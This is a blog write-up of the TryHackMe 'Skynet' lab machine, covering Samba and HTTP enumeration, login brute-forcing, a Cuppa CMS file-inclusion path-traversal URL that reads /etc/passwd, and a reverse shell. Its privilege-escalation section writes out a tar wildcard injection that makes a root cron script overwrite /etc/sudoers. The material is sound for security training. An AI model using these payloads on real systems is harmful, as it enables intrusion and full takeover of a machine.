---
layout: post
title: TryHackMe Skynet write up
---


![box picture](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/thm/skynet/skynet.jpeg)

## about the machine

[skynet](https://tryhackme.com/room/skynet "skynet") is an easy-rated machine from [TryHackMe](https://tryhackme.com "TryHackMe") with the themes being samba/http enumeration and file inclusion

## Reconnaissance

As always I added the box to my `/etc/hosts` file as `ctf.thm` and ran a detailed nmap scan against it

```bash
# Nmap 7.60SVN scan initiated Tue Feb  9 23:06:16 2021 as: nmap -v -sC -sV -oN detailed_scan ctf.thm

Host is up (0.81s latency).

PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE TOP PIPELINING SASL RESP-CODES UIDL CAPA
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LOGINDISABLEDA0001 have listed LITERAL+ capabilities OK Pre-login more IDLE ID SASL-IR IMAP4rev1 ENABLE post-login LOGIN-REFERRALS
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SKYNET<00>           Flags: <unique><active>
|   SKYNET<03>           Flags: <unique><active>
|   SKYNET<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2021-02-09T16:06:40-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-09 23:06:40
|_  start_date: N/A
```

as you can see, http and samba are up, which will be my ticket to get in

## Samba enumeration

after some digging around, I found a share called `anonymous` which was readable by unauthenticated users

```bash
$ ./smbmap.py -H ctf.thm

[+] IP: ctf.thm:445	Name: unknown   	Status: Guest session   	
    Disk                    Permissions       Comment
    ----                    -----------       ------
    print$                  NO ACCESS         Printer Drivers
    anonymous               READ ONLY         Skynet Anonymous Share
    milesdyson              NO ACCESS         Miles Dyson Personal Share
    IPC$                    NO ACCESS         IPC Service (skynet server (Samba, Ubuntu))
```

I've also got a username using `enum4linux`

```bash
$ enum4linux.pl -U ctf.thm
 =============================================== 
|    Enumerating Workgroup/Domain on ctf.thm    |
 =============================================== 
[+] Got domain/workgroup name: WORKGROUP

 ================================ 
|    Session Check on ctf.thm    |
 ================================ 
[+] Server ctf.thm allows sessions using username '', password ''

 ======================== 
|    Users on ctf.thm    |
 ======================== 
 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson	Name: 	Desc: 
```


inside the `anonymous` share, I've a found a note telling people to change their password, along with a wordlist

```bash
$ smbclient //ctf.thm/anonymous -U "" % ""
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]
smb: \> ls
  .                     D        0  Thu Nov 26 17:04:00 2020
  ..                    D        0  Tue Sep 17 08:20:17 2019
  attention.txt					N      163  Wed Sep 18 04:04:59 2019
  logs                  D        0  Wed Sep 18 05:42:16 2019

	9204224 blocks of size 1024. 5831512 blocks available
  
smb: \> get attention.txt 
getting file \attention.txt of size 163 as attention.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> cd logs\
smb: \logs\> ls
  .                            	      D        0  Wed Sep 18 05:42:16 2019
  ..                           	      D        0  Thu Nov 26 17:04:00 2020
  log2.txt                            N        0  Wed Sep 18 05:42:13 2019
  log1.txt                            N      471  Wed Sep 18 05:41:59 2019
  log3.txt                            N        0  Wed Sep 18 05:42:16 2019

		9204224 blocks of size 1024. 5831512 blocks available
smb: \logs\> get log1.txt 
getting file \logs\log1.txt of size 471 as log1.txt (0.3 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \logs\> exit
$ cat attention.txt 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
$ wc -l log1.txt 
31 log1.txt
```

I didn't know where to use the wordlist, so I moved to http

## http enumeration

vising `ctf.thm` in the browser, I found a static page with no `robots.txt` file

![first_index](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/thm/skynet/root_index.png)

I so did some directory bruteforcing with `gobuster` and raft wordlists and I've found some interesting directories


```bash
gobuster dir -u ctf.thm -w $WORDLISTS/raft-medium-directories-lowercase.txt -t 30
/admin (Status: 301)
/js (Status: 301)
/config (Status: 301)
/css (Status: 301)
/squirrelmail (Status: 301)
/ai (Status: 301)
/server-status (Status: 403)
```

`/admin` kept giving me forbidden status, but `squirrelmail` redirected me to a login page

![squirrelmail login](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/thm/skynet/squirrelmail.png)

now that I've got a user and a wordlist, it's time to fire up burpbsuite for some brutforcing

![burpsuite request](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/thm/skynet/burp_request.png)

![burpsuite payloads](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/thm/skynet/burp_paylods.png)

it got the password right away, I can't show it here tho

![password found](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/thm/skynet/password.png)

![loggen in](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/thm/skynet/logged_in.png)

after logging in, I've found 3 emails, one with `milesdyson`'s samba password, and the other two referenceing what is believed to be [ a very interesting AI conversation](https://www.thelanguageindustry.eu/en/taal-en-spraaktechnologie/3539-i-can-i-i-everything-else-bob-said " a very interesting AI conversation")

![ai conversation](https://github.com/0x00Jeff/0x00Jeff.github.io/blob/master/assets/thm/skynet/ai_poem.png)


# back to smb

now that I have `milesdyson`'s password, I can just re-visit his samba share, where I found a note countaining an hidden http directory

```bash
$ smbclient //ctf.thm/milesdyson -U milesdyson
Enter milesdyson's password: 
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]
smb: \> ls
  .                                       D           0  Tue Sep 17 10:05:47 2019
  ..                                      D           0  Wed Sep 18 04:51:03 2019
  Improving Deep Neural Networks.pdf      N     5743095  Tue Sep 17 10:05:14 2019
  Convolutional Neural Networks-CNN.pdf   N    19655446  Tue Sep 17 10:05:14 2019
  notes                                   D           0  Tue Sep 17 10:18:40 2019


		9204224 blocks of size 1024. 5831444 blocks available
smb: \> cd notes
smb: \notes\> ls
  .                                   D        0  Tue Sep 17 10:18:40 2019
  ..                                  D        0  Tue Sep 17 10:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 10:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 10:01:29 2019
....
  important.txt                       N      117  Tue Sep 17 10:18:39 2019
....
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 10:01:29 2019
....

smb: \notes\> get important.txt
getting file \notes\important.txt of size 117 as important.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \notes\> exit

$ cat important.txt

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

## http hidden directory

the webpage contained a static pages with nothing interesting, so I bruteforced for directories again and found another panel running `cuppa` CMS

```bash
$ gobuster dir -u http://10.10.111.111/45kra24zxs28v3yd/ -w $WORDLISTS/raft-medium-directories-lowercase.txt -t 30
/administrator (Status: 301)
```

which redirected me to another login page
![second login page](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/thm/skynet/2nd_login_page.png)


I tried loging in with the http creds I've got before, as well as bruteforce with the wordlist I have but nothing

after sometime I found that the CMS has both a local and a remote `file inclusion` vulnerability

```bash
$ searchsploit cuppa
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                 | php/webapps/25971.txt
-------------------------------------------------------------------------------- ---------------------------------
```

it turned I can include local/remote files from the `/alerts/alertConfigField.php?urlConfig=` endpoint

so I tried including `/etc/passwd`, by visiting `ctf.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../etc/passwd` and it worked

since I know the user, I went ahead and included `user.txt` from `milesdyson`'s home directory, I've looked around for some configuration files or ssh keys but didn't find anything so the next step was to get a reverse shell via remote file inclusion

I sat up and http server using `python` and an `nc` listener then got my conection

![shell via rfi](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/thm/skynet/shell_via_rfi.png)

## gaining root priveleges

 I found a script running as root using `tar` and wildcards in `/home/milesdyson/backups`

```bash
www-data@skynet:/home/milesdyson$ ls
backups  mail  share  user.txt
www-data@skynet:/home/milesdyson$ ls -lh user.txt
-rw-r--r-- 1 milesdyson milesdyson 33 Sep 17  2019 user.txt
www-data@skynet:/home/milesdyson$ cd backups
www-data@skynet:/home/milesdyson/backups$ ls -lh
total 4.5M
-rwxr-xr-x 1 root root   74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root root 4.5M Feb 10 14:51 backup.tgz
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

at this point, what should I do is pretty stright forward, 
just a [little trick](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/ "little trick") with `tar` to edit `/etc/sudoers`, basically giving me the abillity to use sudo as root without a password

```bash
www-data@skynet:/home/milesdyson/backups$ cd  /var/www/html
www-data@skynet:/var/www/html$  echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > demo.sh
www-data@skynet:/var/www/html$ echo "" > "--checkpoint-action=exec=sh demo.sh"
www-data@skynet:/var/www/html$ echo "" > "--checkpoint-action=exec=sh priv.sh"
www-data@skynet:/var/www/html$ echo "" > --checkpoint=1
www-data@skynet:/var/www/html$ cd -
/home/milesdyson/backups
www-data@skynet:/home/milesdyson/backups$ ./backup.sh
tar: /home/milesdyson/backups/backup.tgz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
www-data@skynet:/home/milesdyson/backups$ sudo -l
sudo -l
User www-data may run the following commands on skynet:
    (root) NOPASSWD: ALL
www-data@skynet:/home/milesdyson/backups$ sudo su
root@skynet:/home/milesdyson/backups# whoami
root
root@skynet:/home/milesdyson/backups# ls /root/ -lh
total 4.0K
-rw-r--r-- 1 root root 33 Sep 17  2019 root.txt
```

## conclusion
this was a really nice box with some fun enumeration, see you in the next write up ^^

